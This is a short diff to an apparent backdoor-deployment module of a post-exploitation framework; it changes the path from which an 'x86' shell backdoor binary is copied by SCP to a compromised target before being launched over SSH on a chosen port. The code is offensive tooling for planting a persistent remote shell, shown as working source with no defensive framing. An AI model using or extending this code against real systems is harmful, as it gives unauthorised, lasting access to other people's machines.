@@ -24,7 +24,7 @@ class x86(Backdoor):
         target = self.core.curtarget
         port = self.get_value("port")
         target.ssh.exec_command('rm x86')
-        target.scpFiles(self, 'backdoors/shell/x86/x86', False)
+        target.scpFiles(self, 'backdoors/shell/__x86/x86', False)
         print(GOOD + "Moving the backdoor program")
         target.ssh.exec_command(self.get_command())
         print(GOOD + "x86 backdoor on %s attempted." % port)
